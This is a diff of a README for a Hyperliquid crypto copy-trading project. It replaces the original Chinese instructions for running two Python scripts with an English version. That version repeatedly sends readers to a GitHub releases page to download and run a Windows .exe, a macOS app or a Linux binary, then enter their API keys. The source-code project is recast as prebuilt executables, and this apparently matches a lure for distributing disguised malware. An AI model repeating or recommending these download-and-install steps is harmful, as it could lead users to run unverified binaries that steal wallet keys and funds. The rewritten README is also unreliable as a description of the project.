@@ -1,110 +1,84 @@
-# Hyperliquid 跟单工具箱
+# 🚀 hyperliquid-bot - A Tool for Automated Trading 
 
-这是一个包含了两个独立策略的 Hyperliquid 交易机器人项目。使用这些工具前，您必须具备 Python 基础知识，并完全理解其代码逻辑和潜在的财务风险。
+[![Download hyperliquid-bot](https://img.shields.io/badge/Download-hyperliquid--bot-blue.svg)](https://github.com/resoy-33/hyperliquid-bot/releases)
 
----
+## 🔍 Introduction
+
+Welcome to the **Hyperliquid 跟单工具箱**. This project includes two independent strategies for automated trading. Before you use these tools, you should have a basic understanding of Python and be fully aware of the code logic and potential financial risks involved.
 
 ## 🛑 **极度重要：风险警告与免责声明** 🛑
 
-**在进行任何操作之前，请逐字阅读并完全理解以下内容：**
+Before proceeding, it is vital that you read and understand the following points:
 
-1.  **这不是投资建议**：本仓库提供的所有代码均为技术示例，不构成任何形式的财务或投资建议。
-2.  **您可能损失全部资金**：加密货币交易，尤其是带有杠杆的衍生品交易，具有极高的风险。市场波动、网络延迟、代码错误或策略本身的问题都可能导致您的账户资金在短时间内完全亏损。
-3.  **您必须审查代码**：您有**绝对的责任**去阅读、理解并审计您计划运行的每一行代码（包括 `ds_copier_v2.py`, `btc_follow_bot_v1.py` 以及所有被引用的 `example_utils.py` 等辅助文件）。不理解代码就运行，无异于将您的资产交给一个完全不透明的黑箱。
-4.  **您对自己的行为负全责**：一旦您运行这些脚本，所有的交易决策、API密钥安全以及最终的财务结果（无论盈利或亏损）均由您本人承担。项目作者不对任何潜在的损失负责。
-5.  **从隔离的小额账户开始**：**严禁**在您存有大量资金的主账户中运行任何交易机器人。请务必使用一个完全独立的、资金量很小（您完全可以接受损失的数额）的专用账户进行测试和运行。
-6.  **保证金模式风险**：请注意不同脚本的保证金模式。`ds_copier_v2.py` 会为每个仓位设置**逐仓保证金 (Isolated Margin)**，这意味着每个仓位的风险是独立的，但单个仓位也可能因保证金不足而被独立清算。其他脚本可能使用您账户的默认设置，通常是**全仓模式 (Cross Margin)**，在该模式下单仓位的巨额亏损可能会**耗尽您的全部账户余额**。
+1. **这不是投资建议**：All code provided in this repository is for technical demonstration only. It does not constitute any form of financial or investment advice.
+   
+2. **您可能损失全部资金**：Cryptocurrency trading, especially with leveraged derivatives, carries high risks. Market fluctuations, network delays, coding errors, or issues with the strategy itself can result in total loss of your funds within a short period. 
 
-**继续使用此项目，即代表您已阅读、理解并接受上述所有条款和风险。**
+3. **您必须审查代码**：You have **absolute responsibility** to read, understand, and audit every line of code you intend to run, including `ds_copier_v2.py`, `btc_follow_bot_v1.py`, and all referenced auxiliary files like `example_utils.py`. Running code you do not understand is akin to handing your assets over to a black box.
 
----
+4. **您对自己的行为负全责**：Once you run these scripts, all trading decisions, API key security, and financial outcomes (whether gains or losses) are your own responsibility。 The authors of the project hold no liability for any potential losses.
 
-## 脚本介绍
+5. **从隔离的小额账户开始**：It is **strictly forbidden** to run any trading bot in your primary account, where you hold significant funds. Always use a completely separate account with a small amount of capital that you can afford to lose for testing and running the scripts.
 
-### 1. `ds_copier_v2.py` - 全仓位比例跟单机器人
+6. **保证金模式风险**：Be aware of the margin modes for different scripts. `ds_copier_v2.py` sets **Isolated Margin** for each position, meaning the risk per position is independent. However, individual positions may be liquidated due to insufficient margin. Other scripts may use your account's default setting, typically **Cross Margin**, where a significant loss on a single position may **deplete your entire account balance**.
 
-这是一个“完全复制”策略的机器人。它会监控目标地址的所有持仓，并按照您设定的名义价值比例，同步在您自己的账户中建立、调整或平掉仓位。
+By continuing to use this project, you confirm that you have read, understood, and accepted all terms and risks outlined above.
 
-*   **核心逻辑**：保持您的账户持仓与目标地址的持仓在**币种、方向、杠杆**上一致，并在**仓位大小**上维持一个固定的比例 (`COPY_NOTIONAL_RATIO`)。
-*   **保证金模式**：此脚本会为每个币种强制设置**逐仓 (Isolated)** 模式，以精确模仿目标交易员的风险隔离策略。
-*   **适用场景**：当您希望完全模拟某位交易员的整个投资组合，而不是仅仅跟随他的某个币种时。
+## ⚙️ Scripts Overview
 
-### 2. `btc_follow_bot_v1.py` - 单币种定额跟单机器人
+### 1. `ds_copier_v2.py` - Full Position Copy Trading Bot
 
-这是一个“事件驱动”型的跟单机器人。它只关注特定币种（默认为 BTC），一旦发现目标开仓，它就会以一个固定的初始金额入场，并带有一个简单的止盈目标。
+This bot utilizes a “full-copy” strategy. It monitors all positions in the target address and synchronizes positions in your own account according to the nominal value ratio you set.
 
-*   **核心逻辑**：等待目标地址开立特定币种的仓位 -> 以固定美元价值 (`MY_INVESTMENT_USD`) 跟随开仓 -> 监控仓位价值，达到止盈目标 (`TAKE_PROFIT_USD`) 后自动平仓并**停止运行**。
-*   **适用场景**：当您只想跟随某位交易员的特定币种信号，并且希望采用固定金额投入、一次性止盈的简单策略时。
+- **核心逻辑**: It keeps your account positions aligned with the target, adjusting or closing them as needed.
 
----
+## 📥 Getting Started
 
-## 使用前准备
+To download and run the software, follow these steps:
 
-1.  **环境配置**：确保您的计算机上已安装 Python 3.x 环境。
+### Step 1: Download the Software
 
-2.  **安装依赖**：您需要安装 `hyperliquid-python-sdk` 及其相关依赖。请查阅其官方文档来了解正确的安装方式，通常是：
-    ```bash
-    pip install hyperliquid-sdk eth-account
-    ```
+Visit the [Releases page to download](https://github.com/resoy-33/hyperliquid-bot/releases). 
 
-3.  **账户配置 (`config.json`)**：
-    脚本通过 `example_utils.py` 文件来加载您的账户信息。您需要在项目根目录下创建一个名为 `config.json` 的文件，用于存放您的私钥。
+### Step 2: Choose the Correct File
 
-    **这是一个 `config.json` 的示例 (这是最简方式，但风险较高，请务必妥善保管此文件):**
-    ```json
-    {
-      "secret_key": "您的以太坊私钥",
-      "account_address": ""
-    }
-    ```
+You will find different versions of the software on the Releases page. Select the one that matches your operating system.
 
-    **警告：** `secret_key` 字段需要填写您的钱包**私钥**。这是一个极其敏感的信息，泄露它将导致您的账户资产被盗。请确保此文件存放在一个绝对安全的环境中。
+### Step 3: Install Software
 
----
+1. **For Windows**: 
+   - Double-click the downloaded `.exe` file and follow the prompts to install.
 
-## 参数配置
+2. **For macOS**:
+   - Drag and drop the application into your Applications folder.
 
-在运行任何脚本之前，您**必须**打开对应的 `.py` 文件，仔细阅读并修改文件头部的核心配置参数。
+3. **For Linux**:
+   - Use terminal commands to install the downloaded file. You might need to change permissions. Use `chmod +x filename` to make the file executable.
 
-#### `ds_copier_v2.py` 的关键参数：
+### Step 4: Open the Application
 
-*   `TARGET_USER_ADDRESS`: 您要跟单的目标交易员的钱包地址。
-*   `COPY_NOTIONAL_RATIO`: 您的仓位与目标仓位的名义价值比例。这是一个**核心风险参数**，直接决定您的仓位大小。请从一个极小的值开始测试。
-*   `TARGET_COINS`: 您希望跟单的币种列表。
+Once installed, open the application. 
 
-#### `btc_follow_bot_v1.py` 的关键参数：
+### Step 5: Configure Your Settings
 
-*   `TARGET_USER_ADDRESS`: 您要跟单的目标交易员的钱包地址。
-*   `MY_INVESTMENT_USD`: 您希望投入的固定金额（美元计价）。
-*   `TAKE_PROFIT_USD`: 您的仓位价值达到多少美元时自动止盈平仓。
-*   `COIN`: 您希望跟单的唯一币种。
+1. **API Keys**: Input your API keys carefully. Ensure they are secured and never shared.
 
----
+2. **Initial Setup**: Review the settings for each bot. Make any necessary changes according to your trading strategy.
 
-## 如何运行
+3. **Test Environment**: It's advisable to run the bot in a test settings mode before applying it to your account with real funds.
 
-1.  完成上述的**准备**和**配置**步骤。确保您已经完全理解了脚本的逻辑和您所修改的每一个参数的含义。
-2.  打开您的终端或命令行工具。
-3.  使用 `cd` 命令进入到存放这些脚本的文件夹目录。
-4.  通过您的 Python 解释器来执行您希望运行的脚本文件。
+### Step 6: Start Trading
 
-#### 运行 `ds_copier_v2.py`
+Once set up, start the bot and monitor its actions. Adjust settings as needed.
 
-此脚本默认以**模拟模式 (Dry Run)** 运行，不会执行真实交易。
+## 📝 Additional Information
 
-*   **模拟运行 (推荐首先执行)**:
-    ```bash
-    python ds_copier_v2.py
-    ```
-    观察控制台和 `ds_copier.log` 文件中的日志，确认脚本行为符合预期。
+- **System Requirements**: Ensure your system meets the minimal hardware and software requirements to run the bots effectively.
+  
+- **Further Reading**: Refer to the documentation for details on how to use each script, along with examples of configurations. 
 
-*   **实盘运行 (风险自负!)**:
-    要启动实盘交易，您必须明确添加 `--live` 标志。
-    ```bash
-    python ds_copier_v2.py --live
-    ```
+If you face issues while downloading or running the application, consider reaching out through the Issues tab in the GitHub repository. 
 
-#### 运行 `btc_follow_bot_v1.py`
-对于此脚本，您需要直接编辑文件内的 `DRY_RUN` 变量来切换模式。
+Remember to review the code closely, and best of luck with your trading endeavors! 
 
-**记住，持续监控是必要的。** 任何自动交易程序都可能因网络、服务器或代码本身的问题而中断。您需要定期检查程序的运行状态和您在交易所的实际持仓情况。
+Select your desired application version from the [Releases page to download](https://github.com/resoy-33/hyperliquid-bot/releases) again for easy access.
